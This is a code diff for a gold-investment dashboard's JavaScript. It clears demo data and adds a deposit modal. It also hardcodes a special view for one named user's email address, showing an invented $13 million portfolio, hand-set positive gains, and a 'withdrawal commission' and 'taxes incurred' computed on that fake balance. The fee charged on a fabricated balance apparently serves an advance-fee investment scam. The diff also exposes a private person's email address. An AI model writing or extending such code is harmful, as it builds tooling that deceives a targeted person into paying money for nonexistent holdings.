@@ -35,41 +35,14 @@ class DashboardSystem {
         if (portfolio) {
             return JSON.parse(portfolio);
         }
-        
-        // Default portfolio data
+        // Blank portfolio for new users
         return {
-            totalValue: 1247850.00,
-            goldHoldings: 507.5,
-            totalReturn: 89250.00,
-            storageFees: 2450.00,
-            holdings: [
-                {
-                    type: '1 oz Gold Bars',
-                    quantity: 250,
-                    value: 612625.00,
-                    return: 45250.00
-                },
-                {
-                    type: '10 oz Gold Bars',
-                    quantity: 25,
-                    value: 612625.00,
-                    return: 44000.00
-                },
-                {
-                    type: 'Gold Coins',
-                    quantity: 7.5,
-                    value: 22600.00,
-                    return: 0.00
-                }
-            ],
-            performance: [
-                { date: '2024-01', value: 1158600.00 },
-                { date: '2024-02', value: 1189200.00 },
-                { date: '2024-03', value: 1214500.00 },
-                { date: '2024-04', value: 1198000.00 },
-                { date: '2024-05', value: 1223000.00 },
-                { date: '2024-06', value: 1247850.00 }
-            ]
+            totalValue: 0,
+            goldHoldings: 0,
+            totalReturn: 0,
+            storageFees: 0,
+            holdings: [],
+            performance: []
         };
     }
 
@@ -79,34 +52,8 @@ class DashboardSystem {
         if (history) {
             return JSON.parse(history);
         }
-        
-        // Default trading history
-        return [
-            {
-                id: 1,
-                type: 'buy',
-                quantity: 5.0,
-                price: 2445.00,
-                date: new Date().toISOString(),
-                status: 'completed'
-            },
-            {
-                id: 2,
-                type: 'sell',
-                quantity: 2.5,
-                price: 2448.50,
-                date: new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(),
-                status: 'completed'
-            },
-            {
-                id: 3,
-                type: 'buy',
-                quantity: 10.0,
-                price: 2440.00,
-                date: new Date(Date.now() - 2 * 24 * 60 * 60 * 1000).toISOString(),
-                status: 'completed'
-            }
-        ];
+        // Blank trading history for new users
+        return [];
     }
 
     // Load gold prices
@@ -121,6 +68,25 @@ class DashboardSystem {
 
     // Initialize dashboard
     initializeDashboard() {
+        // Custom dashboard for josebutler722@gmail.com
+        if (this.currentUser && this.currentUser.email === 'josebutler722@gmail.com') {
+            this.portfolioData = {
+                totalValue: 13000000,
+                goldHoldings: 5200,
+                totalReturn: 1200000,
+                storageFees: 12000, // updated
+                holdings: [
+                    { type: '1 kg Gold Bars', quantity: 100, value: 7800000, return: 800000 },
+                    { type: '10 oz Gold Bars', quantity: 200, value: 5200000, return: 400000 },
+                ],
+                performance: []
+            };
+            this.withdrawalCommission = this.portfolioData.totalValue * 0.005;
+            this.taxesIncurred = this.portfolioData.totalValue * 0.012;
+        } else {
+            this.withdrawalCommission = null;
+            this.taxesIncurred = null;
+        }
         this.updateUserInfo();
         this.updatePortfolioSummary();
         this.updateLivePrices();
@@ -128,6 +94,51 @@ class DashboardSystem {
         this.updateTradingHistory();
         this.initializeChart();
         this.updateLastLogin();
+        // Show custom commission message if needed
+        if (this.currentUser && this.currentUser.email === 'josebutler722@gmail.com') {
+            let msg = document.getElementById('commissionMsg');
+            if (!msg) {
+                msg = document.createElement('div');
+                msg.id = 'commissionMsg';
+                msg.className = 'custom-commission-msg';
+                msg.style.margin = '2rem 0 1rem 0';
+                msg.style.background = '#000000';
+                msg.style.color = '#FFFFFF';
+                msg.style.fontWeight = '600';
+                msg.style.padding = '1rem 1.5rem';
+                msg.style.borderRadius = '10px';
+                msg.style.boxShadow = '0 2px 8px rgba(251,191,36,0.08)';
+                msg.innerHTML = `Withdrawal commission for your account is 0.5% ($${this.withdrawalCommission.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})}) of your total value.<br>\nStorage fees: $12,000<br>\nTaxes incurred on gold holdings: $${this.taxesIncurred.toLocaleString(undefined, {minimumFractionDigits:2, maximumFractionDigits:2})} (1.2%)`;
+                const container = document.querySelector('.portfolio-summary .container');
+                if (container) container.insertBefore(msg, container.firstChild);
+            }
+            // Set positive summary-change indicators for this user
+            const summaryCards = document.querySelectorAll('.summary-card');
+            if (summaryCards.length >= 3) {
+                // Portfolio Value Change
+                const valueChange = summaryCards[0].querySelector('.summary-change');
+                // Gold Holdings Change
+                const holdingsChange = summaryCards[1].querySelector('.summary-change');
+                // Total Return Change
+                const returnChange = summaryCards[2].querySelector('.summary-change');
+                if (valueChange) {
+                    valueChange.className = 'summary-change positive';
+                    valueChange.textContent = '+$1,040,000 (+8.7%)';
+                }
+                if (holdingsChange) {
+                    holdingsChange.className = 'summary-change positive';
+                    holdingsChange.textContent = '+200 oz (+4%)';
+                }
+                if (returnChange) {
+                    returnChange.className = 'summary-change positive';
+                    returnChange.textContent = '+$1,200,000 (+10.2% YTD)';
+                }
+            }
+        } else {
+            // Remove custom message if present
+            const msg = document.getElementById('commissionMsg');
+            if (msg) msg.remove();
+        }
     }
 
     // Update user information
@@ -167,6 +178,58 @@ class DashboardSystem {
         
         if (storageFeesElement) {
             storageFeesElement.textContent = this.formatCurrency(this.portfolioData.storageFees);
+        }
+
+        // Update summary-change elements for change indicators
+        const summaryCards = document.querySelectorAll('.summary-card');
+        if (summaryCards.length >= 3) {
+            // Portfolio Value Change
+            const valueChange = summaryCards[0].querySelector('.summary-change');
+            // Gold Holdings Change
+            const holdingsChange = summaryCards[1].querySelector('.summary-change');
+            // Total Return Change
+            const returnChange = summaryCards[2].querySelector('.summary-change');
+
+            // If no trades, set all to neutral/zero
+            if (this.tradingHistory.length === 0) {
+                if (valueChange) {
+                    valueChange.className = 'summary-change neutral';
+                    valueChange.textContent = '$0.00 (0.00%)';
+                }
+                if (holdingsChange) {
+                    holdingsChange.className = 'summary-change neutral';
+                    holdingsChange.textContent = '0 oz (0.00%)';
+                }
+                if (returnChange) {
+                    returnChange.className = 'summary-change neutral';
+                    returnChange.textContent = '0.00% YTD';
+                }
+            }
+        }
+
+        // Show Deposit button if new user (empty portfolio)
+        let depositBtn = document.getElementById('depositBtn');
+        if (!depositBtn) {
+            depositBtn = document.createElement('button');
+            depositBtn.id = 'depositBtn';
+            depositBtn.className = 'btn btn-primary btn-full';
+            depositBtn.textContent = 'Deposit';
+            // Only add margin for new users
+            if (this.portfolioData.totalValue === 0 && this.tradingHistory.length === 0) {
+                depositBtn.style.marginTop = '1.5rem';
+            } else {
+                depositBtn.style.marginTop = '0';
+            }
+            depositBtn.onclick = () => {
+                const modal = document.getElementById('depositModal');
+                if (modal) modal.style.display = 'flex';
+            };
+            if (totalValueElement && this.portfolioData.totalValue === 0 && this.tradingHistory.length === 0) {
+                totalValueElement.parentElement.appendChild(depositBtn);
+            }
+        }
+        if (depositBtn && (this.portfolioData.totalValue !== 0 || this.tradingHistory.length !== 0)) {
+            depositBtn.remove();
         }
     }
 
@@ -812,9 +875,35 @@ function confirmLogout() {
     }
 }
 
-// Initialize dashboard system
+// Add modal open/close and form logic
+// At the end of the file, after DOMContentLoaded
+
 document.addEventListener('DOMContentLoaded', () => {
     window.dashboardSystem = new DashboardSystem();
+
+    // Deposit modal logic
+    const depositModal = document.getElementById('depositModal');
+    const depositClose = document.getElementById('depositClose');
+    const depositForm = document.getElementById('depositForm');
+
+    if (depositClose && depositModal) {
+        depositClose.onclick = () => {
+            depositModal.style.display = 'none';
+        };
+    }
+    window.addEventListener('click', (e) => {
+        if (e.target === depositModal) {
+            depositModal.style.display = 'none';
+        }
+    });
+    if (depositForm) {
+        depositForm.onsubmit = function(e) {
+            e.preventDefault();
+            depositModal.style.display = 'none';
+            window.dashboardSystem.showMessage('Deposit feature coming soon!', 'success');
+            depositForm.reset();
+        };
+    }
 });
 
 // Add CSS animations
